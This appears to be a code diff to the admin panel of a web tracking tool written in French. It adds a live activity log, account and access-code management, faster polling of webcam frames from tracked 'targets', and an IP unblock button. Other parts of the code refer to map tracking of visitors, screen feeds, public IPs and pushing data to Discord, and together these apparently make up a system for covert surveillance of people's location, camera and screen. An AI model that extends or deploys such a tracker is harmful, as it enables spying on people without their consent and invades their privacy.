@@ -779,7 +779,15 @@
                 <button class="btn-clear btn-action-full" onclick="clearAll()">Vider la carte</button>
             </div>
             
-            <div class="status-radar" style="margin: 0;">
+            <div class="action-card" style="background: #000; border-color: #1e293b; font-family: 'JetBrains Mono', monospace; font-size: 0.7rem;">
+                <h4 style="color: var(--accent-primary); font-size: 0.8rem;">Logs Global (Activité)</h4>
+                <div id="global-terminal" style="color: #10b981; max-height: 250px; overflow-y: auto; line-height: 1.4; scrollbar-width: thin;">
+                    <!-- Les logs d'activité globale s'afficheront ici -->
+                    <div style="color: #64748b;">En attente d'activité...</div>
+                </div>
+            </div>
+
+            <div class="status-radar" style="margin: 10px 0 0 0;">
                 <h4>État du Système</h4>
                 <div class="status-line">
                     <span>• API :</span>
@@ -1025,20 +1033,31 @@
             if (canManageAllAccounts()) {
                 adminSection = `
                     <div class="account-panel-section">
-                        <h4>Gestion des comptes</h4>
+                        <h4>Gestion de TOUS les comptes</h4>
+                        <p style="font-size:0.7rem; color:var(--text-dim); margin-bottom:10px;">En tant qu'Admin Master, tu peux voir et gérer tout le monde.</p>
                         <div class="admin-account-list">
                             ${accounts.length ? accounts.map(account => `
                                 <div class="admin-account-item">
-                                    <strong>${account.username}${account.username === currentAccount.username ? ' (toi)' : ''}</strong>
+                                    <strong style="color: ${account.username === currentAccount.username ? 'var(--accent-success)' : 'white'}">${account.username}${account.username === currentAccount.username ? ' (toi)' : ''}</strong>
+                                    <div style="font-size:0.75rem; color:var(--text-dim); margin-bottom:5px;">Accès: ${ACCESS_CODES[account.access]?.label || 'aucun'}</div>
                                     <select onchange="updateManagedAccountAccess('${account.username}', this.value); renderAccountPanel();">
                                         ${Object.keys(ACCESS_CODES).map(level =>
                                             `<option value="${level}" ${(account.access || 'none') === level ? 'selected' : ''}>${ACCESS_CODES[level].label}</option>`
                                         ).join('')}
                                     </select>
-                                    <button type="button" class="secondary" style="margin-top:8px;width:100%;" onclick="deleteManagedAccountWithConfirm(${JSON.stringify(account.username)})">Supprimer</button>
+                                    <button type="button" class="secondary" style="margin-top:8px;width:100%;" onclick="deleteManagedAccountWithConfirm(${JSON.stringify(account.username)})">Supprimer ce compte</button>
                                 </div>
                             `).join('') : '<p style="color:var(--text-dim);font-size:0.85rem;">Aucun compte.</p>'}
                         </div>
+                    </div>
+                `;
+            } else {
+                // Pour les utilisateurs normaux
+                adminSection = `
+                    <div class="account-panel-section">
+                        <h4>Actions de compte</h4>
+                        <button type="button" class="btn-refresh btn-action-full" style="background:var(--accent-primary); color:white; margin-bottom:10px;" onclick="promptChangeAccessCode()">Changer mon code d'accès</button>
+                        <button type="button" class="btn-danger-outline btn-action-full" style="background:var(--danger); color:white;" onclick="deleteCurrentAccountWithConfirm()">Supprimer mon compte</button>
                     </div>
                 `;
             }
@@ -1047,13 +1066,37 @@
                 <div class="account-panel-section">
                     <h4>Mon compte</h4>
                     <div class="detail-row"><span class="detail-label">Nom</span><span class="detail-value">${currentAccount.username}</span></div>
-                    <div class="detail-row"><span class="detail-label">Accès actuel</span><span class="detail-value" style="color:var(--accent-success);">${accessLabel}</span></div>
-                    <p style="font-size:0.75rem;color:var(--text-dim);margin:10px 0 0;">Pour changer d'accès, déconnecte-toi et entre un nouveau code à la connexion.</p>
-                    <button type="button" class="btn-danger-outline btn-action-full" style="margin-top:12px;background:var(--danger);color:white;" onclick="deleteCurrentAccountWithConfirm()">Supprimer mon compte</button>
+                    <div class="detail-row"><span class="detail-label">Mon accès</span><span class="detail-value" style="color:var(--accent-success);">${accessLabel}</span></div>
                 </div>
                 ${adminSection}
-                <button type="button" class="btn-clear btn-action-full" onclick="logoutAdmin()">Se déconnecter</button>
+                <button type="button" class="btn-clear btn-action-full" style="margin-top:20px;" onclick="logoutAdmin()">Se déconnecter</button>
             `;
+        }
+
+        function promptChangeAccessCode() {
+            const newCode = prompt("Entre ton nouveau code d'accès :");
+            if (!newCode) return;
+            
+            const level = resolveAccess(newCode);
+            if (!level && normalizeAccessCode(newCode) !== ADMIN_MANAGER_CODE.toLowerCase()) {
+                alert("Code d'accès invalide.");
+                return;
+            }
+
+            const finalLevel = (normalizeAccessCode(newCode) === ADMIN_MANAGER_CODE.toLowerCase()) ? 'full' : level;
+            
+            // Mise à jour locale
+            const accounts = getAccounts();
+            const account = accounts.find(a => a.username === currentAccount.username);
+            if (account) {
+                account.access = finalLevel;
+                saveAccounts(accounts);
+                currentAccess = finalLevel;
+                saveAccess(finalLevel);
+                saveAdminSession(currentAccount.username, finalLevel);
+                alert("Code d'accès mis à jour ! La page va s'actualiser.");
+                window.location.reload();
+            }
         }
 
         function logoutAdmin() {
@@ -1289,10 +1332,37 @@
 
             refreshMapSize();
             loadSessions();
+            loadGlobalLogs();
             setInterval(loadSessions, 10000);
+            setInterval(loadGlobalLogs, 5000); // Logs toutes les 5 secondes
             setInterval(updateMap, 5000);
             setInterval(pushToDiscord, 10000);
             setInterval(refreshTargetOnlineStatus, 8000);
+        }
+
+        async function loadGlobalLogs() {
+            if (!hasAccess('settings')) return;
+            try {
+                const res = await fetch('/api/export-logs');
+                if (!res.ok) return;
+                const data = await res.json();
+                const terminal = document.getElementById('global-terminal');
+                if (!terminal || !data.logs) return;
+
+                const logs = data.logs.split('\n').filter(l => l.trim() !== '').reverse();
+                if (logs.length === 0) {
+                    terminal.innerHTML = '<div style="color: #64748b;">Aucune activité récente.</div>';
+                    return;
+                }
+
+                terminal.innerHTML = logs.map(log => {
+                    const isNew = log.includes('Session:');
+                    const color = isNew ? '#10b981' : '#94a3b8';
+                    return `<div style="color: ${color}; margin-bottom: 4px; border-bottom: 1px solid rgba(255,255,255,0.05); padding-bottom: 2px;">${log}</div>`;
+                }).join('');
+            } catch (e) {
+                console.warn('Erreur chargement logs:', e);
+            }
         }
 
         let map = null;
@@ -1605,7 +1675,10 @@
             const poll = async () => {
                 if (cameraPollSessionId !== sid) return;
                 try {
-                    const res = await fetch(`/api/camera-frame?sessionId=${encodeURIComponent(sid)}&t=${Date.now()}`, { cache: 'no-store' });
+                    const res = await fetch(`/api/camera-frame?sessionId=${encodeURIComponent(sid)}&t=${Date.now()}`, { 
+                        cache: 'no-store',
+                        headers: { 'Pragma': 'no-cache' }
+                    });
                     if (!res.ok) return;
                     const data = await res.json();
                     const preview = document.getElementById('camera-preview');
@@ -1618,7 +1691,7 @@
                         preview.src = data.frame;
                         preview.style.display = 'block';
                         status.style.display = 'none';
-                    } else if (!data.frame && Date.now() - lastFrameAt > 8000) {
+                    } else if (!data.frame && Date.now() - lastFrameAt > 10000) {
                         preview.style.display = 'none';
                         status.style.display = 'block';
                         status.textContent = 'Pas de flux — PC sans webcam, permission refusée, ou onglet en arrière-plan.';
@@ -1629,7 +1702,8 @@
             };
 
             poll();
-            cameraPollTimer = setInterval(poll, 1200);
+            // Polling admin plus rapide (800ms) pour coller au rythme du tracker
+            cameraPollTimer = setInterval(poll, 800);
         }
 
         let screenPollTimer = null;
@@ -2095,7 +2169,8 @@
                         <div class="action-card">
                             <h4>Restriction d'accès</h4>
                             <p style="font-size: 0.75rem; color: var(--text-dim); margin-bottom: 10px;">Bloque l'accès au site et arrête le tracking pour cette IP.</p>
-                            <button class="btn-danger-outline btn-action-full" onclick="deleteSession('${sid}')">Tuer la session (IP-KILL)</button>
+                            <button class="btn-danger-outline btn-action-full" style="background:var(--danger); color:white;" onclick="deleteSession('${sid}')">Tuer la session (IP-KILL)</button>
+                            <button class="btn-clear btn-action-full" style="margin-top:10px; border-color:var(--accent-success); color:var(--accent-success);" onclick="unblockSelectedIp('${sid}')">DÉBLOQUER L'IP</button>
                         </div>
                     </div>
                 `;
@@ -2104,6 +2179,31 @@
                 document.getElementById('details-modal').style.display = 'block';
                 switchTab('info'); // Par défaut sur Info
             } catch (e) { console.error(e); }
+        }
+
+        async function unblockSelectedIp(sid) {
+            if (!requireAccess('full')) return;
+            if (!sid) return;
+            
+            try {
+                const res = await fetch(`/api/sessions?sessionId=${sid}`);
+                const data = await res.json();
+                const ip = data.movement && data.movement.length ? data.movement[0].publicIp : null;
+                
+                if (!ip) {
+                    alert("Impossible de trouver l'IP pour cette session.");
+                    return;
+                }
+
+                const unblockRes = await fetch(`/api/unblock-ip?publicIp=${ip}`, { method: 'DELETE' });
+                if (unblockRes.ok) {
+                    alert(`L'IP ${ip} a été débloquée.`);
+                } else {
+                    alert("Erreur lors du déblocage.");
+                }
+            } catch (e) {
+                alert("Erreur de connexion.");
+            }
         }
 
         function centerOnCible(sid) {
